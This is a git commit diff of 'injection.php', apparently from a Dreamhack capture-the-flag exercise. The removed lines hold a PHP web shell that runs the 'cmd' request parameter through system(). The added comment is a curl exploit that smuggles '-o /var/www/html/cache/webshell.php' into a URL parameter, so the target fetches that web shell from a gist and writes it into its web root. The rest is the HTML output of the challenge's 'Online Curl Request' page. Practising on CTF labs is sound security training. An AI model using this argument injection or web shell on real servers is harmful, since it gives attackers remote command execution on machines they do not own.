ca6e3c8b57ad955f46f1a218a41f4a79d70f4bef
kimbjabgok <144577911+kimbjabgok@users.noreply.github.com>
2026-09-15 22:34:25 +0900

    Update injection.php

--- injection.php
+++ injection.php
@@ -1,17 +1,9 @@
-# curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php
+# curl http://host1.dreamhack.games:9531/?url=https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%20-o%20/var/www/html/cache/webshell.php
 <html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
-</body>
-</html>
+    <head></head>
+    <link rel="stylesheet" href="/static/bulma.min.css" />
+    <body>
+        <div class="container card">
+        <div class="card-content">
+        <h1 class="title">Online Curl Request</h1>
+    <p>cache file: <a href='./cache/6a30d84b65db00da19171ec2049ae621'>./cache/b7a384b35ca74814471d992d83c388bc</a></p><pre></pre>
